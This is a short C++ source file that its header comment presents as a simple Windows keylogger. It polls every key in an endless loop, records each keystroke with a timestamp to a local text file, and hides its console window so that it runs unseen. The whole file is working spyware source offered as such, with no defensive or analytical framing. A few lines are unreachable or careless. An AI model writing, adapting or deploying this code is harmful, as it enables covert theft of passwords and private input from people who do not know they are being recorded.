/* a simple keylogger write in c++
 * Just running in Windows, and test in Windows7(64bit).
 * Author: s0nnet <http://ww.s0nnet.com>
 */


#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include <malloc.h>

using namespace std;  
int Save (int key_stroke);
void Stealth();

int main() 
{
    Stealth(); 
	char data;
	while (1) {
		for(data = 8; data <= 190; data ++) {
			if (GetAsyncKeyState(data) == -32767)
				Save(data);
		}
	}
	system ("PAUSE");
	return 0;
}

int Save (int key_stroke) {
	if ( (key_stroke == 1) || (key_stroke == 2) )
		return 0;

	time_t t=time(0);
	char tm[64];
	strftime(tm, sizeof(tm), "%Y-%m-%d %X", localtime(&t));

	int size;
	char *logs;
	logs = (char *)malloc(100);

	cout << key_stroke << endl;

    if (key_stroke == 8)
		size = sprintf(logs, "[%s] %s", tm, "[BackSpace]"); 
    else if (key_stroke == 13)
		size = sprintf(logs, "[%s] %s", tm, "[Enter]"); 
    else if (key_stroke == 32)
		size = sprintf(logs, "[%s] %s", tm, "|_|");
    else if (key_stroke == VK_TAB)              
		size = sprintf(logs, "[%s] %s", tm, "[Tab]");
    else if (key_stroke == VK_SHIFT)
		size = sprintf(logs, "[%s] %s", tm, "[Shift]");
    else if (key_stroke == VK_CONTROL)
		size = sprintf(logs, "[%s] %s", tm, "[Ctrl]");
    else if (key_stroke == VK_ESCAPE)
		size = sprintf(logs, "[%s] %s", tm, "[Esc]");
    else if (key_stroke == VK_END)
		size = sprintf(logs, "[%s] %s", tm, "[End]");
    else if (key_stroke == VK_HOME)
		size = sprintf(logs, "[%s] %s", tm, "[Home]");
    else if (key_stroke == VK_LEFT)
		size = sprintf(logs, "[%s] %s", tm, "[Left]");
    else if (key_stroke == VK_UP)
		size = sprintf(logs, "[%s] %s", tm, "[Up]");
    else if (key_stroke == VK_RIGHT)
		size = sprintf(logs, "[%s] %s", tm, "[Right]");
    else if (key_stroke == VK_DOWN)
		size = sprintf(logs, "[%s] %s", tm, "[Down]");
    else if (key_stroke == 190 || key_stroke == 110)
		size = sprintf(logs, "[%s] %s", tm, ".");
    else
		size = sprintf(logs, "[%s] %s", tm, &key_stroke);

	FILE *fp;
	fp = fopen("keylogger_logs.txt", "a+");
	fwrite(logs, size, 1, fp);
	fputc('\n', fp);
	fclose(fp);
	free(logs);

	return 0;
    HWND Stealth;

	AllocConsole();
}

void Stealth() {
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
}